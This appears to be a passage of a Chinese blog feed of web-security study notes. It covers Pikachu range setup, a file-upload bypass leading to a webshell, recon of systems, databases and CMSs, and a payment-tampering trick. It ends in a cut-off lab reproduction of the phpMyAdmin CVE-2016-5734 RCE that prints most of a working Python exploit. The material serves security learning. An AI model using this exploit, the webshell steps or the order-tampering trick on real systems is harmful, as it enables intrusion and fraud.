      <link href="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/"/>
      <url>/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/</url>
      
        <content type="html"><![CDATA[<h1 id="靶场pikachu"><a href="#靶场pikachu" class="headerlink" title="靶场pikachu"></a>靶场pikachu</h1><p>搭建平台：phpstudy </p><p>环境:win7</p><p>网站源码:pikachu 地址：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p><p>将pikachu的网站源码直接复制到C:\phpStudy\PHPTutorial\WWW目录中，效果如下：</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image1.png" alt="image1"></p><p>进去之后点击页面发现点不动</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image2.png" alt="image2"></p><p>先进入首页，初始化pikachu</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image3.png" alt="image3"></p><p>初始化还是报数据库连接失败</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image4.png" alt="image4"></p><p>进入C:\phpStudy\PHPTutorial\WWW\pikachu-master\inc目录下，修改config.inc.php文件，修改数据库密码</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image5.png" alt="image5"></p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image6.png" alt="image6"></p><p>再次访问网站，成功！</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image7.png" alt="image7"></p><p>我们来试试靶场上的文件上传漏洞，结合一句话木马和菜刀工具来拿到网站的权限</p><p>创建一个php文件</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image8.png" alt="image8"></p><p>进入靶场的Unsafe Fileupload，点击client check，上传这个php文件</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image9.png" alt="image9"></p><p>我们查看源代码，找到检查文件类型的部分</p><p>可见我们只需要将上传文件格式改成jpg png gif就可以了</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image10.png" alt="image10"></p><p>我们将test.php改成test.jpg,再次上传</p><p>上传成功！</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image11.png" alt="image11"></p><p>然后我们访问这个文件，发现无法显示，因为这个php文件改成jpg格式之后就无法执行了</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image12.png" alt="image12"></p><p>使用burpsuite抓包，在上传文件的时候修改文件类型，从而达到绕过的目的</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image13.png" alt="image13"></p><p>上传成功后我们利用中国菜刀来获取权限</p><p><img src="/2021/11/18/%E9%9D%B6%E5%9C%BApikachu/image14.png" alt="image14"></p><p>成功！</p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场搭建，漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门——系统及数据库</title>
      <link href="/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="05-基础入门——系统及数据库"><a href="#05-基础入门——系统及数据库" class="headerlink" title="05 基础入门——系统及数据库"></a>05 基础入门——系统及数据库</h1><p><img src="/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/image1.png" alt="image1.png"></p><h2 id="操作系统层面"><a href="#操作系统层面" class="headerlink" title="操作系统层面"></a>操作系统层面</h2><p><strong>识别操作系统常见方法：</strong></p><p>1.nmap扫描</p><p>2.windows大小写不敏感，linux大小写敏感（比如url大小写试探可以判断）</p><p>3.TTL值：linux一般为64（&lt;100），windows一般为128（&gt;100）</p><p><strong>两者区别及识别意义</strong></p><p><strong>操作系统层面漏洞类型对应意义：</strong></p><p>利用漏洞进行内网渗透、横向渗透，比如永恒之蓝等</p><p><strong>操作系统层面漏洞影响范围：</strong></p><p>拿到服务器权限等</p><h2 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h2><p><strong>识别数据库类型常见方法：</strong></p><p>1.nmap工具扫描</p><p>2.对应端口开放等</p><p><strong>数据库类型区别及识别意义</strong></p><p><strong>数据库常见漏洞类型及攻击</strong></p><p><strong>数据库层面漏洞影响范围</strong></p><p><strong>常见脚本对应的数据库类型：</strong></p><p>ASP+Access</p><p>php+mysql</p><p>aspx+mssql</p><p>jsp+mssql,oracle</p><p>python+mongodb<br>…</p><p><strong>常见数据库对应的默认端口：</strong></p><p><strong>关系型数据库:</strong><br>1.Oracle数据库默认端口号为，1521;</p><p>2.MySQL数据库默认端口号为，3306;</p><p>3.SQLServer数据库默认端口号为，1433;<br><strong>NOSQL数据库:</strong><br>1.MongoDB默认端口号为:27017;</p><p>2.Redis默认端口号为:6379;<br>3.memcached默认端口号为:11211;<br>其他:</p><p>1527 Derby<br>5432 pgsql<br>5000 db2<br>9092 pointbase<br>无默认端口 Informix</p><h2 id="第三方层面"><a href="#第三方层面" class="headerlink" title="第三方层面"></a>第三方层面</h2><p>如何判断有那些第三方平台或软件</p><p>简要为什么要识别第三方平台或软件</p><p>常见第三方平台或软件漏洞类型及攻击</p><p>简要第三方平台或软件安全测试的范围</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>除去常规WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，负载均衡等)，也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。所以明确安全测试思路是很重要的!</p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全学习，学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门——WEB源码拓展</title>
      <link href="/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/"/>
      <url>/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="04-基础入门——WEB源码拓展"><a href="#04-基础入门——WEB源码拓展" class="headerlink" title="04 基础入门——WEB源码拓展"></a>04 基础入门——WEB源码拓展</h1><h2 id="一、知识点"><a href="#一、知识点" class="headerlink" title="一、知识点"></a>一、知识点</h2><ul><li><strong>关于WEB源码目录结构</strong></li><li><strong>关于WEB源码脚本类型</strong></li><li><strong>关于WEB源码应用分类</strong></li><li><strong>关于WEB源码其他说明</strong></li></ul><p>1.数据库配置文件，后台目录，模版目录，数据库目录等</p><p>2.ASP,PHP,ASPX,JSP,JAVAWEB等脚本类型源码安全问题<br>语言与框架（(还包含内网渗透等web安全知识): <a href="https://websec.readthedocs.io/zh/latest/language/index.html(%E5%A6%82%E6%9E%9C%E8%83%BD%E5%BE%97%E5%88%B0%E6%BA%90%E7%A0%81%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8Bconfig.php%EF%BC%8C%E4%B8%80%E8%88%AC%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E4%BC%9A%E6%9C%89%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%EF%BC%8C%E6%89%BE%E5%88%B0%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E5%90%8E%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E4%BD%A0%E6%87%82%E5%BE%97)">https://websec.readthedocs.io/zh/latest/language/index.html(如果能得到源码，可以查看config.php，一般这个文件会有用户名和密码，找到后台管理登录界面后。。。。你懂得)</a></p><p>3.社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞<br>4.开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等(CMS:内容管理系统，通过CMS识别，可以判断对方的网站搭建框架（有可能是用网上的源码稍加修改搭建起来的);如果对方是用框架搭建的，则可以根据对应框架的漏洞进行分析;如果不是，则需要分析源码了)<br>5.关于源码获取的相关途径:搜索，咸鱼淘宝，第三方源码站（菜鸟源码、tor，tg等)，各种行业对应</p><p><strong>总结：</strong></p><p>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外〕，在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak文件等)，未获取到的源码采用各种方法想办法获取!</p><p><img src="/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/image1.png" alt="image1.png"></p><h2 id="二、演示案例"><a href="#二、演示案例" class="headerlink" title="二、演示案例"></a>二、演示案例</h2><h3 id="ASP-PHP等源码下安全测试"><a href="#ASP-PHP等源码下安全测试" class="headerlink" title="ASP,PHP等源码下安全测试"></a>ASP,PHP等源码下安全测试</h3><p>平台识别-某CMS无漏洞-默认数据库</p><p>平台识别-某CMS有漏洞-漏洞利用<br>windows下查看文件MD5值:</p><p><code>certutil -hashfile 文件名</code></p><h3 id="源码应用分类下的针对漏洞"><a href="#源码应用分类下的针对漏洞" class="headerlink" title="源码应用分类下的针对漏洞"></a>源码应用分类下的针对漏洞</h3><p>niushop电商类关注漏洞点-业务逻辑<br>商品支付漏洞利用:购买商品，通过bp抓包(点击“立即购买”时抓)、改包(商品数星改为&lt;=0)，再Forward让网页页面跳转到支付界面，即可实现0元支付。</p><h3 id="简要目标从识别到源码获取"><a href="#简要目标从识别到源码获取" class="headerlink" title="简要目标从识别到源码获取"></a>简要目标从识别到源码获取</h3><p>人工爆框架-搜索特定url(输入indexylogin/login/token搜索有漏洞的网站，还可以搜网站文件名如arc.listview.class.php)-获取其他相符站点-漏洞测试借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码宙计或其他。<br>还可以把url放到ThinkPHP进行漏洞检测、命令执行、getshell;可以尝试去搜索引擎搜一下index/login/login/token，找到对应网站再放到thnkphp中检测。</p><h2 id="三、涉及资源"><a href="#三、涉及资源" class="headerlink" title="三、涉及资源"></a>三、涉及资源</h2><p>搜十二堂源码下载站</p><p>咸鱼获取源码<br>云悉指纹识别: <a href="https://www.yunsee.cn/">https://www.yunsee.cn</a><br>CMS识别工具(如果失效就去小迪博客里找) ∶<a href="https://w.ddosi.workers.dev/">https://w.ddosi.workers.dev/</a><br><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a><br><a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a><br>和百<br><a href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a><br>语言与框架(还包含内网渗透等web安全知识) : <a href>https:/websec.readthedocs.io/zh/latest/language/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全学习，学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门——搭建安全拓展</title>
      <link href="/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/"/>
      <url>/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="03-基础入门——搭建安全拓展"><a href="#03-基础入门——搭建安全拓展" class="headerlink" title="03 基础入门——搭建安全拓展"></a>03 基础入门——搭建安全拓展</h1><h2 id="设计知识"><a href="#设计知识" class="headerlink" title="设计知识"></a>设计知识</h2><p>1.常见搭建平台脚本启用</p><p>2.域名IP目录解析安全问题</p><p>3.常见文件后缀解析对应安全</p><p>4.常见安全测试中的安全防护</p><p>5.WEB后门与用户及文件权限</p><h2 id="WEB源码中敏感文件"><a href="#WEB源码中敏感文件" class="headerlink" title="WEB源码中敏感文件"></a>WEB源码中敏感文件</h2><p>后台路径，数据库配置文件，备份文件等</p><p>（寻找方式：google搜索方法、robots.txt文件、抓包、御剑、铸剑工具等）</p><h2 id="IP或域名解析WEB源码目录对应下的存在的安全问题"><a href="#IP或域名解析WEB源码目录对应下的存在的安全问题" class="headerlink" title="IP或域名解析WEB源码目录对应下的存在的安全问题"></a>IP或域名解析WEB源码目录对应下的存在的安全问题</h2><p>域名访问，IP访问（结合类似备份文件目录）</p><h2 id="脚本后缀对应解析（其他格式可相同——上传安全）"><a href="#脚本后缀对应解析（其他格式可相同——上传安全）" class="headerlink" title="脚本后缀对应解析（其他格式可相同——上传安全）"></a>脚本后缀对应解析（其他格式可相同——上传安全）</h2><p>存在下载或为解析问题</p><h2 id="常见防护中的IP验证，域名验证等"><a href="#常见防护中的IP验证，域名验证等" class="headerlink" title="常见防护中的IP验证，域名验证等"></a>常见防护中的IP验证，域名验证等</h2><p>用IP访问的权限比域名要高（比如有些目录只有ip才能访问出来：有些网站建设人员会疏忽，可以用ip去访问，有时会发现一些备份文件源码等），使用御剑或者手动访问的时候最好用ip，别用域名。</p><p>后门是否给予执行权限</p><p>后门是否给予操作目录或文件权限</p><p>后门是否给予其他用户权限</p><p>总结下关于可能会存在的安全或防护问题？</p><p><strong>这里举个例子，在win7上用phpstudy搭建一个本地网站，这里存在两个网站html和kkk</strong></p><p><img src="/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/image1.png" alt="image1"></p><p><strong>然后指定域名study.com对应的是html网站</strong></p><p><img src="/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/image2.png" alt="image2"></p><p><strong>我们访问study.com，此时我们只能访问html目录的内容，访问kkk的话就会报错</strong></p><p><img src="/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/image3.png" alt="image3"></p><p><img src="/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/image4.png" alt="image4"></p><p><strong>但我们用ip地址访问的话显示的就是整个WWW目录下的内容，就可以访问html和kkk目录下的所有内容</strong></p><p><img src="/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/image5.png" alt="image5"></p><p><img src="/2021/11/13/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/image6.png" alt="image6"></p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全学习，学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞复现</title>
      <link href="/2021/11/12/phpMyAdmin-4-0-x%E2%80%944-6-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/11/12/phpMyAdmin-4-0-x%E2%80%944-6-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="phpMyAdmin-4-0-x—4-6-2-远程代码执行漏洞（CVE-2016-5734）"><a href="#phpMyAdmin-4-0-x—4-6-2-远程代码执行漏洞（CVE-2016-5734）" class="headerlink" title="phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）"></a>phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）</h1><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进<code>preg_replace</code>函数第一个参数中。</p><p>在PHP5.4.7以前，<code>preg_replace</code>的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p><p>以下版本受到影响：</p><ul><li>4.0.10.16之前4.0.x版本</li><li>4.4.15.7之前4.4.x版本</li><li>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>开启docker的vulhub镜像</p><p><img src="/2021/11/12/phpMyAdmin-4-0-x%E2%80%944-6-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image1.png" alt="image1"></p><p>然后浏览器输入本地IP地址:8080</p><p>因为这个功能需要登录，且能够写入数据，输入账号root，密码root登录</p><p><img src="/2021/11/12/phpMyAdmin-4-0-x%E2%80%944-6-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image2.png" alt="image2"></p><p>利用脚本POC（cve-2016-5734.py）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit</span></span><br><span class="line"><span class="string">Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.</span></span><br><span class="line"><span class="string">CVE: CVE-2016-5734</span></span><br><span class="line"><span class="string">Author: https://twitter.com/iamsecurity</span></span><br><span class="line"><span class="string">run: ./cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system(&#x27;ls -lua&#x27;);&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;@iamsecurity&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;URL with path to PMA&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;PHP command(s) to eval()&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--user&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--pwd&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Password for valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-d&quot;</span>, <span class="string">&quot;--dbs&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Existing database at a server&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-T&quot;</span>, <span class="string">&quot;--table&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Custom table name for exploit.&quot;</span>)</span><br><span class="line">    arguments = parser.parse_args()</span><br><span class="line">    url_to_pma = arguments.url</span><br><span class="line">    uname = arguments.user</span><br><span class="line">    upass = arguments.pwd</span><br><span class="line">    <span class="keyword">if</span> arguments.dbs:</span><br><span class="line">        db = arguments.dbs</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        db = <span class="string">&quot;test&quot;</span></span><br><span class="line">    token = <span class="literal">False</span></span><br><span class="line">    custom_table = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> arguments.table:</span><br><span class="line">        custom_table = <span class="literal">True</span></span><br><span class="line">        table = arguments.table</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table = <span class="string">&quot;prgpwn&quot;</span></span><br><span class="line">    <span class="keyword">if</span> arguments.cmd:</span><br><span class="line">        payload = arguments.cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">&quot;system(&#x27;uname -a&#x27;);&quot;</span>`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size = <span class="number">32</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># you can manually add proxy support it&#x27;s very simple ;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s.proxies = &#123;&#x27;http&#x27;: &quot;127.0.0.1:8080&quot;, &#x27;https&#x27;: &quot;127.0.0.1:8080&quot;&#125;</span></span><br><span class="line"></span><br><span class="line">s.verify = <span class="literal">False</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;CREATE TABLE `&#123;0&#125;` (</span></span><br><span class="line"><span class="string">  `first` varchar(10) CHARACTER SET utf8 NOT NULL</span></span><br><span class="line"><span class="string">) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span></span><br><span class="line"><span class="string">INSERT INTO `&#123;0&#125;` (`first`) VALUES (UNHEX(&#x27;302F6500&#x27;));</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(table)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_token</span></span><br><span class="line"></span><br><span class="line">resp = s.post(url_to_pma + <span class="string">&quot;/?lang=en&quot;</span>, <span class="built_in">dict</span>(</span><br><span class="line">    pma_username=uname,</span><br><span class="line">    pma_password=upass</span><br><span class="line">))</span><br><span class="line"><span class="keyword">if</span> resp.status_code <span class="keyword">is</span> <span class="number">200</span>:</span><br><span class="line">    token_place = resp.text.find(<span class="string">&quot;token=&quot;</span>) + <span class="number">6</span></span><br><span class="line">    token = resp.text[token_place:token_place + <span class="number">32</span>]</span><br><span class="line"><span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Cannot get valid authorization token.&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> custom_table <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;is_js_confirmed&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">        <span class="string">&quot;pos&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sql_query&quot;</span>: sql,</span><br><span class="line">        <span class="string">&quot;sql_delimiter&quot;</span>: <span class="string">&quot;;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;show_query&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fk_checks&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SQL&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ajax_page_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    resp = s.post(url_to_pma + <span class="string">&quot;/import.php&quot;</span>, data, cookies=requests.utils.dict_from_cookiejar(s.cookies))</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> resp.json():</span><br><span class="line">            <span class="keyword">if</span> resp.json()[<span class="string">&quot;success&quot;</span>] <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">                first = resp.json()[<span class="string">&quot;error&quot;</span>][resp.json()[<span class="string">&quot;error&quot;</span>].find(<span class="string">&quot;&lt;code&gt;&quot;</span>)+<span class="number">6</span>:]</span><br><span class="line">                error = first[:first.find(<span class="string">&quot;&lt;/code&gt;&quot;</span>)]</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;already exists&quot;</span> <span class="keyword">in</span> error:</span><br><span class="line">                    <span class="built_in">print</span>(error)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;ERROR: &quot;</span> + error)</span><br><span class="line">                    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># build exploit</span></span><br><span class="line"></span><br><span class="line">exploit = &#123;</span><br><span class="line">    <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">    <span class="string">&quot;table&quot;</span>: table,</span><br><span class="line">    <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">    <span class="string">&quot;goto&quot;</span>: <span 